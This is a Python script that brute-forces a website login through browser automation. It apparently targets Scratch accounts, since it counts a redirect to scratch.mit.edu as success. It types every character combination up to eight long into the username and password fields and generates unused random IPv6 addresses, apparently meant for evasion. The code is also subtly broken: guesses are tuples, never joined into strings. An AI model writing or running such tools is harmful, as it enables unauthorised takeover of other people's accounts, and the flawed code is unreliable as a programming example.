import itertools
import string
import ipaddress
import random
from webbot import Browser

url = input('website:')
user = input('Input Username:')
current_url = url
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES
web = Browser()
def random_ipv6():
    return ipaddress.IPv6Address._string_from_ip_int(
        random.randint(0, MAX_IPV6)
    )
def guess_password():
    chars = string.ascii_lowercase + string.digits + '!' + '@' + '#' + '$'
    attempts = 0
    for password_length in range(1, 9):
        for guess in itertools.product(chars, repeat=password_length):
            attempts += 1
            web.go_to(url)
            random_ipv6()
            web.click('username')
            web.type(user , into='username')
            web.type(guess , into='Password' , id='Password') # specific selection
            web.click('login')
            current_url = web.get_current_url()
            print(guess)
            if current_url == 'https://scratch.mit.edu/':
                return 'password is {}. found in {} guesses.'.format(guess, attempts)

print(guess_password())
